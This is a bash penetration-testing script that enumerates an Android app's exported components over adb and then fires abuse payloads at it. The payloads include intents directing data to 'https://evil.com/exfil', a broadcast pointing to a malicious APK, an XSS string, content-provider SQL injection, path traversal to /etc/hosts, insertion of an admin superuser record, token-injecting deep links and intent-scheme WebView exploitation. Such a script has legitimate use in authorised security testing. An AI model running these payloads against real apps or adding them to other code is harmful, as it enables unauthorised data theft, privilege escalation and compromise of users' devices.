#!/bin/bash
# Android Exported Component Enumeration & Intent Abuse
#
# Usage:
#   chmod +x exported_components.sh
#   ./exported_components.sh com.target.app
#
# Requirements: adb, aapt (Android SDK), drozer (optional)

PKG="${1:?Usage: $0 <package_name>}"
echo "=== Target: $PKG ==="

# ============================================================
# 1. List all exported components
# ============================================================
echo -e "\n[*] Exported Activities:"
adb shell dumpsys package "$PKG" | grep -A1 "Activity " | grep "exported=true"

echo -e "\n[*] Exported Services:"
adb shell dumpsys package "$PKG" | grep -A1 "Service " | grep "exported=true"

echo -e "\n[*] Exported Receivers:"
adb shell dumpsys package "$PKG" | grep -A1 "Receiver " | grep "exported=true"

echo -e "\n[*] Exported Providers:"
adb shell dumpsys package "$PKG" | grep -A1 "Provider " | grep "exported=true"

# ============================================================
# 2. Full component dump (AndroidManifest extraction)
# ============================================================
echo -e "\n[*] Extracting AndroidManifest.xml..."
APK_PATH=$(adb shell pm path "$PKG" | head -1 | sed 's/package://')
adb pull "$APK_PATH" /tmp/target.apk 2>/dev/null
if command -v aapt &>/dev/null; then
    aapt dump xmltree /tmp/target.apk AndroidManifest.xml | grep -E "(activity|service|receiver|provider|intent-filter|action|category|data)" 2>/dev/null
fi

# ============================================================
# 3. Launch exported activities
# ============================================================
echo -e "\n[*] Activity launch tests:"

# Launch main activity
adb shell am start -n "$PKG/.MainActivity"

# Launch with specific intent data
adb shell am start -n "$PKG/.DeepLinkActivity" -d "https://evil.com/callback"

# Launch with extras
adb shell am start -n "$PKG/.WebViewActivity" \
    --es "url" "https://evil.com" \
    --es "title" "Legit Page"

# Launch with URI-based intent
adb shell am start -a android.intent.action.VIEW -d "appscheme://path?token=leaked"

# Force activity (even non-exported, requires root/debug)
adb shell am start -n "$PKG/.admin.AdminPanelActivity" --force-stop-before-start

# ============================================================
# 4. Service abuse
# ============================================================
echo -e "\n[*] Service binding tests:"

# Start exported service
adb shell am startservice -n "$PKG/.sync.SyncService"

# Send intent to service with data
adb shell am startservice -n "$PKG/.UploadService" \
    --es "endpoint" "https://evil.com/exfil" \
    --es "data" "stolen_token"

# ============================================================
# 5. Broadcast receiver abuse
# ============================================================
echo -e "\n[*] Broadcast tests:"

# Send broadcast to exported receiver
adb shell am broadcast -a "$PKG.ACTION_UPDATE" \
    --es "url" "https://evil.com/malicious.apk"

# Common vulnerable broadcast actions
adb shell am broadcast -a "$PKG.PUSH_NOTIFICATION" \
    --es "message" "<script>alert(1)</script>" \
    --es "url" "javascript:void(0)"

# Send ordered broadcast
adb shell am broadcast -a "$PKG.ACTION_LOGIN_RESULT" \
    --es "token" "injected_token" \
    --es "user" "admin"

# ============================================================
# 6. Content provider abuse
# ============================================================
echo -e "\n[*] Content provider tests:"

# Query exposed content providers
adb shell content query --uri "content://$PKG.provider/users"
adb shell content query --uri "content://$PKG.provider/accounts"
adb shell content query --uri "content://$PKG.fileprovider/"

# SQL injection in content provider
adb shell content query --uri "content://$PKG.provider/users" --where "1=1) OR 1=1--"

# Path traversal in file provider
adb shell content read --uri "content://$PKG.fileprovider/../../../../etc/hosts"

# Insert into content provider
adb shell content insert --uri "content://$PKG.provider/users" \
    --bind name:s:admin --bind role:s:superuser

# ============================================================
# 7. Deep link / URL scheme abuse
# ============================================================
echo -e "\n[*] Deep link tests:"

# Common deep link patterns
adb shell am start -a android.intent.action.VIEW -d "${PKG}://login?token=stolen"
adb shell am start -a android.intent.action.VIEW -d "${PKG}://webview?url=https://evil.com"
adb shell am start -a android.intent.action.VIEW -d "${PKG}://callback?code=injected"
adb shell am start -a android.intent.action.VIEW -d "${PKG}://reset-password?email=victim@target.com"
adb shell am start -a android.intent.action.VIEW -d "https://target.com/.well-known/assetlinks.json"

# Intent scheme URL (WebView exploitation)
adb shell am start -a android.intent.action.VIEW \
    -d "intent://evil.com#Intent;scheme=http;component=$PKG/.WebViewActivity;end"

# ============================================================
# 8. Pending intent hijacking
# ============================================================
echo -e "\n[*] Pending intent analysis:"
adb shell dumpsys activity intents | grep "$PKG"
adb shell dumpsys notification | grep "$PKG"

# ============================================================
# 9. Task hijacking (StrandHogg)
# ============================================================
echo -e "\n[*] Task affinity check:"
adb shell dumpsys package "$PKG" | grep -i "taskAffinity"
adb shell dumpsys package "$PKG" | grep -i "launchMode"
adb shell dumpsys package "$PKG" | grep -i "allowTaskReparenting"

# ============================================================
# 10. Drozer commands (if available)
# ============================================================
if command -v drozer &>/dev/null; then
    echo -e "\n[*] Drozer enumeration:"
    drozer console connect -c "run app.package.attacksurface $PKG"
    drozer console connect -c "run app.activity.info -a $PKG"
    drozer console connect -c "run app.service.info -a $PKG"
    drozer console connect -c "run app.broadcast.info -a $PKG"
    drozer console connect -c "run app.provider.info -a $PKG"
    drozer console connect -c "run scanner.provider.injection -a $PKG"
    drozer console connect -c "run scanner.provider.traversal -a $PKG"
    drozer console connect -c "run scanner.activity.browsable -a $PKG"
fi

echo -e "\n[*] Done. Review output for exported components and test each manually."
